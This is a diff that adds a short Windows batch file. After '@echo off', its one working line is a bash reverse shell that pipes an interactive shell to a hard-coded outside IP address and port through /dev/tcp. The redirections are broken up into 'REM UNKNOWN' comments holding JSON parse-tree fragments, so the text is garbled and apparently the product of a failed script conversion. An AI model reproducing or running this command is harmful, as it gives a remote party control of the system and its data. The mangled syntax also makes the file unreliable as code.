@@ -1,0 +1,3 @@
+@echo off
+
+/bin/bash -i REM UNKNOWN: {"type":"Redirect","op":{"text":">","type":"great"},"file":{"text":"/dev/tcp/82.165.97.169/2022","type":"Word"}} REM UNKNOWN: {"type":"Redirect","op":{"text":"<&","type":"lessand"},"file":{"text":"1","type":"Word"},"numberIo":{"text":"0","type":"io_number"}} REM UNKNOWN: {"type":"Redirect","op":{"text":">&","type":"greatand"},"file":{"text":"1","type":"Word"},"numberIo":{"text":"2","type":"io_number"}}
